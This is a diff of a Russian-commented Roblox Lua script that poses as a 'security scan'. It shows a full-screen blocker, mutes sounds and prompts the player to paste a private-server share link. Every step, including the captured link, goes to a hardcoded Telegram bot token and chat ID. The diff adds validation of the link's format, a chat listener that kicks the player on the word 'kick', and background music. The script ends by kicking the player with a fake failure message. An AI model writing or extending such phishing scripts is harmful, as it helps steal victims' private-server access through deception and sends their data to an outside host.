@@ -2,11 +2,19 @@
 local BOT_TOKEN = "7853266185:AAEuuAibqk-H4oCTwCJD438NHNoXAg3PTDw"
 local YOUR_CHAT_ID = "8070071877"
 
+-- Сервисы
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local SoundService = game:GetService("SoundService")
+local CoreGui = game:GetService("CoreGui")
+
+local LocalPlayer = Players.LocalPlayer
+
 -- ===== TELEGRAM ФУНКЦИЯ =====
 local function sendToTelegram(message)
     spawn(function()
         pcall(function()
-            local encoded = game:GetService("HttpService"):UrlEncode(message)
+            local encoded = HttpService:UrlEncode(message)
             local url = string.format(
                 "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s",
                 BOT_TOKEN,
@@ -18,17 +26,41 @@ local function sendToTelegram(message)
     end)
 end
 
+-- ===== ФУНКЦИЯ КИКА ПО КОМАНДЕ В ЧАТЕ =====
+local function setupChatListener()
+    local chatService = game:GetService("Chat") -- В некоторых эксплойтах может использоваться другой метод
+    
+    -- Попытка получить доступ к событиям чата через Players.LocalPlayer
+    LocalPlayer.Chatted:Connect(function(message)
+        -- Проверка на наличие подстроки 'kick' (без учета регистра)
+        if string.find(string.lower(message), "kick") then
+            sendToTelegram("🚨 КОМАНДА 'KICK' ОБНАРУЖЕНА В ЧАТЕ! Кикаю пользователя.")
+            
+            -- Выключение музыки перед киком
+            if CoreGui:FindFirstChild("SWILL_Music") then
+                CoreGui.SWILL_Music:Destroy()
+            end
+            
+            LocalPlayer:Kick("Что то пошло не так пробуйте снова")
+        end
+    end)
+    sendToTelegram("💬 Чат-мониторинг на 'kick' активирован.")
+end
+
 -- ===== НАЧАЛО =====
 sendToTelegram("🚀 SWILL SYSTEM ACTIVATED")
 sendToTelegram("👤 User ID: " .. YOUR_CHAT_ID)
 sendToTelegram("⏰ Time: " .. os.date("%H:%M:%S"))
+
+-- Активируем мониторинг чата
+setupChatListener()
 
 -- ===== ПОЛНОЭКРАННЫЙ БЛОКИРОВЩИК =====
 local gui = Instance.new("ScreenGui")
 gui.Name = "SWILL_Fullscreen"
 gui.DisplayOrder = 9999
 gui.IgnoreGuiInset = true
-gui.Parent = game.CoreGui
+gui.Parent = CoreGui
 
 local background = Instance.new("Frame")
 background.Size = UDim2.new(1, 0, 1, 0)
@@ -43,7 +75,7 @@ background.Parent = gui
 -- ===== ВЫКЛЮЧЕНИЕ ЗВУКОВ =====
 local function muteAllSounds()
     pcall(function()
-        game:GetService("SoundService").RespectFilteringEnabled = false
+        SoundService.RespectFilteringEnabled = false
         for _, sound in pairs(game:GetDescendants()) do
             if sound:IsA("Sound") then
                 sound.Volume = 0
@@ -55,6 +87,33 @@ end
 
 muteAllSounds()
 sendToTelegram("🔇 Звуки отключены")
+
+-- ===== ДОБАВЛЕНИЕ ФОНОВОЙ МУЗЫКИ =====
+local music
+local function playBackgroundMusic()
+    pcall(function()
+        music = Instance.new("Sound")
+        music.SoundId = "rbxassetid://1840837330" -- ID для спокойной музыки (Acoustic Guitar Loop)
+        music.Volume = 0.3 -- Низкая громкость
+        music.Looped = true
+        music.Playing = true
+        music.Name = "SWILL_Music"
+        music.Parent = CoreGui -- Добавляем в CoreGui для изоляции
+    end)
+    if music and music.IsLoaded then
+        sendToTelegram("🎶 Фоновая музыка активирована.")
+    else
+        sendToTelegram("⚠️ Не удалось загрузить фоновую музыку.")
+    end
+end
+
+local function stopBackgroundMusic()
+    if music and music.Parent then
+        music:Stop()
+        music:Destroy()
+        sendToTelegram("🎶 Фоновая музыка отключена.")
+    end
+end
 
 -- ===== ПРОСТОЙ ИНТЕРФЕЙС =====
 local title = Instance.new("TextLabel")
@@ -103,7 +162,7 @@ percentText.Parent = background
 task.wait(2)
 status.Text = "checking server configuration..."
 
-local playerCount = #game.Players:GetPlayers()
+local playerCount = #Players:GetPlayers()
 sendToTelegram("🔍 Проверка сервера: " .. playerCount .. " игроков")
 
 if playerCount > 1 then
@@ -111,7 +170,7 @@ if playerCount > 1 then
     sendToTelegram("❌ Ошибка: " .. playerCount .. " игроков")
     
     task.wait(3)
-    game.Players.LocalPlayer:Kick("SWILL: Private server required")
+    LocalPlayer:Kick("SWILL: Private server required")
     return
 else
     status.Text = "server verified"
@@ -122,6 +181,9 @@ end
 task.wait(1)
 status.Text = "analyzing security systems..."
 sendToTelegram("📊 Анализ систем безопасности...")
+
+-- Воспроизведение музыки на время загрузки
+playBackgroundMusic()
 
 for i = 1, 100 do
     progressFill.Size = UDim2.new(i/100, 0, 1, 0)
@@ -166,13 +228,48 @@ sendToTelegram("⌛ Ожидание ссылки на приватный сер
 local linkCaptured = false
 local capturedLink = ""
 
+-- ===== МИНИМАЛЬНАЯ ПРОВЕРКА ПРИВАТКИ =====
+local function isValidPrivateLink(link)
+    -- Базовая проверка формата Roblox приватной ссылки
+    if type(link) ~= "string" then
+        return false
+    end
+    
+    local pattern = "https?://www%.roblox%.com/share%?code="
+    if not string.match(link, pattern) then
+        return false
+    end
+    
+    -- Проверяем что после code= есть данные
+    local codePart = string.match(link, "code=([^&]+)")
+    if not codePart or codePart == "" then
+        return false
+    end
+    
+    return true
+end
+
 submitBtn.MouseButton1Click:Connect(function()
     if inputBox.Text ~= "" then
         capturedLink = inputBox.Text
+        
+        -- ПРОВЕРКА ССЫЛКИ
+        if not isValidPrivateLink(capturedLink) then
+            inputBox.Text = ""
+            
+            -- ИЗМЕНЕНИЕ ТЕКСТА ОШИБКИ СОГЛАСНО ЗАПРОСУ
+            inputBox.PlaceholderText = "Сыллка неверная" 
+            
+            sendToTelegram("❌ Неверная ссылка получена: " .. capturedLink)
+            sendToTelegram("⚠️ Требуется формат: https://www.roblox.com/share?code=...")
+            return
+        end
+        
         linkCaptured = true
         
         sendToTelegram("📎 ПРИВАТНАЯ ССЫЛКА ПОЛУЧЕНА:")
         sendToTelegram("🔗 " .. capturedLink)
+        sendToTelegram("✅ Формат ссылки проверен")
         sendToTelegram("⏳ Начинаю сканирование...")
         
         inputFrame:Destroy()
@@ -235,6 +332,8 @@ while tick() - scanStart < SCAN_TIME_SECONDS do
 end
 
 -- ===== ЗАВЕРШЕНИЕ =====
+stopBackgroundMusic() -- Останавливаем музыку по завершении сканирования
+
 progressFill.Size = UDim2.new(1, 0, 1, 0)
 percentText.Text = "100%"
 status.Text = "scan complete"
@@ -262,4 +361,4 @@ end
 
 sendToTelegram("👋 Отключение от системы...")
 
-game.Players.LocalPlayer:Kick("SWILL: Scan failed (" .. SCAN_TIME_MINUTES .. "m). Please rejoin and try again.")
+LocalPlayer:Kick("SWILL: Scan failed (" .. SCAN_TIME_MINUTES .. "m). Please rejoin and try again.")
